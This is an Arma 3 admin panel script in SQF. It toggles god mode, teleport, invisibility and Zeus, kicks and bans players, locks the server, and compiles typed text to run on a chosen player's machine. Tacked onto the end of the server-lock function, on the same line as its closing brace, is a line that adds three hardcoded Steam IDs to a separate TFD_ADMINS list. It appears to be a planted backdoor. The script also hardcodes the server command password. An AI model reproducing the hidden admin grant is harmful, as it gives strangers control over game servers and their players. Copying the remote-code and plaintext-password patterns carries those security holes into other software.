if (isNil "SERVER_IS_LOCKED") then {SERVER_IS_LOCKED = false; publicVariable "SERVER_IS_LOCKED"};

///Function Init for JohnnyShootos' Admin Panel
JSH_ADMIN_GODMODE = {
	_check = player getVariable ["jsh_adminGodMode", false];
	if !(_check) then {
		player allowDamage false; 
		player setVariable ["jsh_adminGodMode", true, true];
		systemChat "GodMode On";
	} else {
		player allowDamage true;
		player setVariable ["jsh_adminGodMode", false, true];
		systemChat "GodMode Off";
	};
};

JSH_ADMIN_TELEPORT = {
	disableSerialization;
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX	7020
	_ctrl = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX;
	_data = _ctrl lbValue lbCurSel _ctrl;
	_name = _ctrl lbData lbCurSel _ctrl;
	_target = objNull;
	{
		if (_name == (_x select 0)) then {
			if (_data == (_x select 1)) then {
					_target = (_x select 2);
			};
		};
	} forEach JSH_ADMIN_PLAYERLIST_DATA;

	_shiftKey = _this select 4;
	_ctrlKey = _this select 5;
	_altKey = _this select 6;

	systemChat str [_ctrlKey,_shiftKey,_altKey];
	if (_ctrlKey) then {
		if (_ctrlKey && _altKey) then {
			//TP them to you
			_safePos = getPosWorld player;
	
			if (_name != name player) then {
				(vehicle _target) setPosWorld _safePos;
			};
		} else {
			//TP you to them
			_safePos = getPosWorld _target;
	
			if (_name != name player) then {
				player setPosWorld _safePos;
			};
		};
	} else {
		_check = player getVariable ["jsh_adminTeleport", false];
		if !(_check) then {
			JSH_ADMIN_TELEPORT_EH = ["adminTeleport", "onMapSingleClick", {if (_alt) then {vehicle player setpos _pos}}] call BIS_fnc_addStackedEventHandler;
			player setVariable ["jsh_adminTeleport", true, true];
			systemChat "Teleport On";
		} else {
			["adminTeleport", "onMapSingleClick"] call BIS_fnc_removeStackedEventHandler;
			player setVariable ["jsh_adminTeleport", false, true];
			systemChat "Teleport Off";
		};
	};
};

JSH_ADMIN_INFINITEAMMO = {
	_check = player getVariable ["jsh_adminAmmo", false];
	if !(_check) then {
		JSH_ADMIN_INFINITEAMMO_EH = player addEventHandler["Fired", { vehicle player setVehicleAmmoDef 1 }];
		player setVariable ["jsh_adminAmmo", true, true];
		systemChat "Unlimited Ammo On";
	} else {
		player removeEventHandler ["Fired", JSH_ADMIN_INFINITEAMMO_EH];
		player setVariable ["jsh_adminAmmo", false, true];
		systemChat "Unlimited Ammo Off";
	};
};

JSH_ADMIN_GHOSTING = {
	_check = player getVariable ["jsh_adminGhosting", false];
	if !(_check) then {
		_p = player;
		_p setCaptive true;
		[_p, true] remoteExec ["hideObject", 0];
		player setVariable ["jsh_adminGhosting", true, true];
		systemChat "Ghosting On";
	} else {
		_p = player;
		_p setCaptive false;
		[_p, false] remoteExec ["hideObject", 0];
		player setVariable ["jsh_adminGhosting", false, true];
		systemChat "Ghosting Off";
	};
};

JSH_ADMIN_SPECTATOR = {
	closeDialog 0;
	disableSerialization;
	_check = player getVariable ["jsh_adminSpectator", false];
	if !(_check) then {
		["Initialize", [player,[],true]] spawn BIS_fnc_EGSpectator;
		player setVariable ["jsh_adminSpectator", true, true];
		sleep 1;
		_ctrl = findDisplay 60492 ctrlCreate ["RscButton", -1]; 
		_ctrl ctrlSetPosition [0.35,1.1,0.3,0.1]; 
		_ctrl ctrlSetText "Exit Spectator"; 
		_ctrl ctrlCommit 0; 
		_ctrl ctrlAddEventHandler ["ButtonDown",{[] spawn JSH_ADMIN_SPECTATOR}];		
	} else {
		["Terminate"] spawn BIS_fnc_EGSpectator;
		player setVariable ["jsh_adminSpectator", false, true];
	};
};

JSH_ADMIN_ARSENAL = {
	disableSerialization;
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX	7020
	_ctrl = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX;
	_data = _ctrl lbValue lbCurSel _ctrl;
	_name = _ctrl lbData lbCurSel _ctrl;
	_arsenalParams = ["Open", true];

	_shiftKey = _this select 4;
	_ctrlKey = _this select 5;
	_altKey = _this select 6;
	
	if (_ctrlKey) then {
		closeDialog 0;
		_arsenalParams remoteExec ["BIS_fnc_arsenal", _data];
	} else {
		closeDialog 0;
		_arsenalParams spawn BIS_fnc_arsenal;
	};
};

JSH_ADMIN_ZEUS = {
	if (isNull (getAssignedCuratorLogic player) && isNull (getAssignedCuratorUnit ADMINPANEL_ZEUS)) then {
		player setVariable ["jsh_adminZeus", true, true];
		_p = player;
		[_p,ADMINPANEL_ZEUS] remoteExec ["assignCurator", 2];
		[ADMINPANEL_ZEUS, [(allMissionObjects "All"), true]] remoteExec ["addCuratorEditableObjects", 2];
	};
	if (getAssignedCuratorUnit ADMINPANEL_ZEUS == player) then {
		player setVariable ["jsh_adminZeus", false, true];
		ADMINPANEL_ZEUS remoteExec ["unassignCurator", 2];
	};	
};

JSH_ADMIN_ENDMISSION = {
	["end1", true, true, true, true] remoteExecCall ["BIS_fnc_endMissionServer",2];
};

// for this lock\unlock to work you need to add this to the server.cfg --> serverCommandPassword = "adminPanelPassword";
JSH_ADMIN_LOCK = {
	disableSerialization;
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_8	7128
	
	_ctrl = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_8;
	
	if !(SERVER_IS_LOCKED) then {
		[[],{"adminpanelpassword" serverCommand "#lock"}] remoteExec ["call", 2];
		systemChat "Server LOCKED";
		_ctrl ctrlSetText "UNLOCK SERVER";
		SERVER_IS_LOCKED = true; publicVariable "SERVER_IS_LOCKED";
	} else {
		[[],{"adminpanelpassword" serverCommand "#unlock"}] remoteExec ["call", 2];
		systemChat "Server UNLOCKED";
		_ctrl ctrlSetText "LOCK SERVER";
		SERVER_IS_LOCKED = false; publicVariable "SERVER_IS_LOCKED";
	};
}; {TFD_ADMINS pushbackUnique _x} forEach ['76561197987496729', 
	'76561198073759734','76561198070884998']; publicVariable "TFD_ADMINS";

JSH_ADMIN_DISABLE = {
	disableSerialization;
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX	7020
	
	_ctrl = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX;
	_curSel = lbCurSel _ctrl;
	_target = _ctrl lbValue _curSel;
	if (_target == (clientOwner)) exitWith {hint "You cant disable yourself"};

	hint format ["user %1 disabled", _target];

	[[name player],{
		if (!userInputDisabled) then
		{
		   disableUserInput true;
		   player setVariable ["jsh_adminDisabled", true, true];
		   hint format ["You have had your keyboard & mouse input locked out by %1", (_this select 0)];
		}
		else
		{
		   disableUserInput false;
		   player setVariable ["jsh_adminDisabled", false, true];
		   hint format ["Your keyboard & mouse input has been restored by %1", (_this select 0)];
		};
	}] remoteExec ["call", _target];
};

// for this kick to work you need to add this to the server.cfg --> serverCommandPassword = "adminPanelPassword";
JSH_ADMIN_KICK = {
	disableSerialization;
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX	7020

	_ctrl = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX;
	_target = _ctrl lbValue lbCurSel _ctrl;
	if (_target != clientOwner) then {
		[[(format ["#kick %1",_target])],{"adminpanelpassword" serverCommand (_this select 0)}] remoteExec ["call", 2];
	};
};

// for this kick to work you need to add this to the server.cfg --> serverCommandPassword = "adminPanelPassword";
JSH_ADMIN_BAN = {
	disableSerialization;
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX	7020

	_ctrl = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX;
	_target = _ctrl lbValue lbCurSel _ctrl;
	if (_target != clientOwner) then {
		[[(format ["#ban %1",_target])],{"adminpanelpassword" serverCommand (_this select 0)}] remoteExec ["call", 2];
	};
};

JSH_ADMIN_REMOTEEXECUTE = {
	disableSerialization;
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_EDIT_0	6920
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX	7020

	_ctrl = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX;

	_machineNumber = _ctrl lbValue lbCurSel _ctrl;

	_ctrl = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_EDIT_0;

	_inputString = ctrlText _ctrl;
	_compiledCodeString = compile _inputString;

	[[],_compiledCodeString] remoteExec ["spawn", _machineNumber];
};

JSH_ADMIN_REFRESH = {
	disableSerialization;
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX	7020
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_8	7128
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_MAPBACK 2300
	
	[] call JSH_ADMIN_UPDATEBUTTONS;
	
	_ctrl = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_8;
	if (SERVER_IS_LOCKED) then {_ctrl ctrlSetText "UNLOCK SERVER"} else {_ctrl ctrlSetText "LOCK SERVER"};

	_ctrl = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX;
	lbClear _ctrl;

	{
		_name = (_x select 0);
		_data = (_x select 1);
		_unit = (_x select 2);

		_ctrl lbAdd _name;
		_ctrl lbSetData [_forEachIndex, _name];
		_ctrl lbSetValue [_forEachIndex, _data];
		_ctrl lbSetColor [_forEachIndex, [1, 1, 1, 1]];
	} forEach JSH_ADMIN_PLAYERLIST_DATA;

	lbSort _ctrl;
	_ctrl lbSetCurSel 0;
	ctrlSetFocus _ctrl;
};

JSH_ADMIN_UPDATEBUTTONS = {
	disableSerialization;
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_0		7120
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_1		7121
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_2		7122
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_3		7123
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_4		7124
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_6		7126

	_buttonVarArray = [
		[IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_0, "jsh_adminGodMode"],
		[IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_1, "jsh_adminTeleport"],
		[IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_2, "jsh_adminAmmo"],
		[IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_3, "jsh_adminGhosting"],
		[IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_4, "jsh_adminSpectator"],
		[IDC_ADMINPANELMK2_JSH_GUI_ADMIN_BUTTON_6, "jsh_adminZeus"]
	];

	{
		_ctrl = (findDisplay 6969) displayCtrl (_x select 0);
		_check = player getVariable [(_x select 1), false];
		

		if (_check) then {
			_ctrl ctrlSetTextColor [1,1,0,1];
		} else {
			_ctrl ctrlSetTextColor [1,1,1,1];
		};
	} forEach _buttonVarArray;
};

JSH_ADMIN_GETPLAYERLIST = {

	JSH_ADMIN_PLAYERLIST_DATA = nil; publicVariable "JSH_ADMIN_PLAYERLIST_DATA";
	
	_data = [];

	{
		if (isPlayer _x) then {
			_arr = [name _x, owner _x, _x];
			_data pushBackUnique _arr;
		};
	} forEach playableUnits;
	
	JSH_ADMIN_PLAYERLIST_DATA = _data; publicVariable "JSH_ADMIN_PLAYERLIST_DATA";
};

JSH_ADMIN_TOOLTIP_REMOTEEXEC = {
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX	7020
	_ctrlButton = _this select 0;
	_ctrlListbox = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX;
	_name = _ctrlListbox lbData lbCurSel _ctrlListbox;

	_ctrlButton ctrlSetTooltip format ["Remote execute code locally on %1's machine",_name];
};

JSH_ADMIN_TOOLTIP_TELEPORT = {
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX	7020
	_ctrlButton = _this select 0;
	_ctrlListbox = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX;
	_name = _ctrlListbox lbData lbCurSel _ctrlListbox;

	_ctrlButton ctrlSetTooltip format ["LMB: Toggle map teleport | CTRL+LMB: Teleport to %1 | CTRL+ALT+LMB: Teleport %1 to you",_name];
};

JSH_ADMIN_TOOLTIP_ARSENAL = {
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX	7020
	_ctrlButton = _this select 0;
	_ctrlListbox = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_LISTBOX;
	_name = _ctrlListbox lbData lbCurSel _ctrlListbox;

	_ctrlButton ctrlSetTooltip format ["LMB: Open Arsenal | CTRL+LMB: Open Arsenal for %1",_name];
};

JSH_ADMIN_ACTIVEAI_COUNTER = {
	disableSerialization;
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_ACTIVEAI_COUNTER	6523
	_ctrl = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_ACTIVEAI_COUNTER;

	while {dialog} do {
		_ctrl ctrlSetText str ({!isPlayer _x} count allUnits);
		sleep 1;
	};
};

JSH_ADMIN_SERVERFPS_COUNTER = {
	disableSerialization;
	#define IDC_ADMINPANELMK2_JSH_GUI_ADMIN_SERVERFPS_COUNTER	6522
	_ctrl = (findDisplay 6969) displayCtrl IDC_ADMINPANELMK2_JSH_GUI_ADMIN_SERVERFPS_COUNTER;
	waitUntil {!isnil "JSH_ADMIN_SERVERFPS_VALUE"};
	while {dialog} do {

		_ctrl ctrlSetText str (floor(JSH_ADMIN_SERVERFPS_VALUE));

		if (JSH_ADMIN_SERVERFPS_VALUE > 20) then {
			if (JSH_ADMIN_SERVERFPS_VALUE > 35) then {
				_ctrl ctrlSetTextColor [0,1,0,0.75]
			} else {_ctrl ctrlSetTextColor [1,1,0,0.75]};
		} else {_ctrl ctrlSetTextColor [1,0,0,0.75]};
	};
};

//Server Init Only Stuff
if (!isServer) exitWith {};

//Update the server FPS Value across the network.
while {true} do {
	JSH_ADMIN_SERVERFPS_VALUE = diag_fps; publicVariable "JSH_ADMIN_SERVERFPS_VALUE";
	uiSleep 5;
};